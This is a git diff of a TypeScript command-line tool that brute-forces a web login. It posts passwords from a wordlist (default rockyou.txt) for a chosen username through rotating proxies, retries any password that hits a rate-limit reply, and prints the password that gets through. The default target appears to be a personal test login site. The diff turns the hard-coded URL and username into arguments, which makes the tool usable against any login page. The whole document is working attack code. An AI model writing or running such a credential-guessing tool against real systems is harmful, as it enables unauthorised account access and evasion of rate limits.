@@ -22,7 +22,8 @@ option("header",{type:"string",default:"application/json"})
 .option("body",{type:"string"})
 .option("method",{type:"string"})
 .option("wordlist",{type:"string",default:"/usr/share/wordlists/rockyou.txt"})
-.option("error",{type:"string",default:"error"}).option("U",{type:"string"}).parseSync()
+.option("error",{type:"string",default:"error"})
+.option("U",{type:"string"}).parseSync()
 
 let url= yarg.url || "https://login-de-pruebas-1.onrender.com/login"
 
@@ -47,7 +48,7 @@ async function worker(proxie:any){let i=0;
     
     while(i<yarg.n){try{let contraseña= wordlist.shift();
        
-            axios.post("https://login-de-pruebas-1.onrender.com/login",{usuario:"netaru3",contraseña:contraseña},{httpAgent:proxie,httpsAgent:proxie})
+            axios.post(url,{usuario:yarg.u,contraseña:contraseña},{httpAgent:proxie,httpsAgent:proxie})
      .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña!)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
        
      
